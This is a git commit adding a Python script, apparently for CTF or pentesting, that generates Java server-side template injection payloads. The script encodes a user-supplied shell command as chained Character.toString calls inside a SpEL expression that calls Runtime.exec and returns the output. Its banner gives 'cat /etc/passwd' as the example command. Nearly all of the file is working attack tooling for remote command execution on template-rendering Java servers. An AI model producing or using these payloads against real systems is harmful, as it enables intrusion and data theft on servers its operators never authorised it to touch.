f460aea4360ea5c218e4b8ffd7752c62c89abc3b
KaungYanPaing <51271827+KaungYanPaing@users.noreply.github.com>
2022-08-27 22:00:49 +0630

    Add files via upload

---
+++ SSTI_Payload_Generator.py
@@ -0,0 +1,57 @@
+import requests
+
+def main():
+	banner()
+	ssti_generator()
+	while True:
+		process = input('Do u want to continue (Y/N):: ')
+		if (process == 'yes' or process == 'y' or process == 'Yes' or process == 'Y'):
+			ssti_generator()
+			continue
+		elif (process == 'no' or process == 'n' or process == 'No' or process == 'N'):
+			break
+		else:
+			print('Enter either [Y] or [N]:: ')
+
+def banner():
+	print('\n')
+	print('\t ==--==--==--==--==--==--==--==--==--==')
+	print('\t ==--==--==--==--==--==--==--==--==--==')
+	print('\t ==-- SSTI(java) Payload Generator --==')
+	print('\t ==--     Author : k4ung_k4ung     --==')
+	print('\t ==--==--==--==--==--==--==--==--==--==')
+	print('\t ==--==--==--==--==--==--==--==--==--==')
+	print('\n')
+	print(' Server-Side Template Injection ASCII payload generator for java')
+	print(' eg - Enter Commands here - cat /etc/passwd')
+	print('\n')
+
+def ssti_generator():
+	text = input("\n Enter Commands here - ")
+
+	ascii_values = []
+
+	for character in text:
+    		ascii_values.append(ord(character))
+
+	skip_values = ascii_values[1:]
+
+	payload_outputs = []
+
+	for x in range(len(skip_values)):
+		data = skip_values[x]
+		payload = ".concat(T(java.lang.Character).toString("+str(data)+"))"
+		payload_outputs.append(payload)
+
+	skip_code = ''.join(map(str, payload_outputs))
+
+	ssti_payload_generator = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString("+str(ascii_values[0])+")"+str(skip_code)+").getInputStream())}"
+	
+	print('\n')
+	
+	print("Generated Payload is here --->  "+ssti_payload_generator)
+	
+	print('\n')
+
+if __name__ == '__main__':main()
+
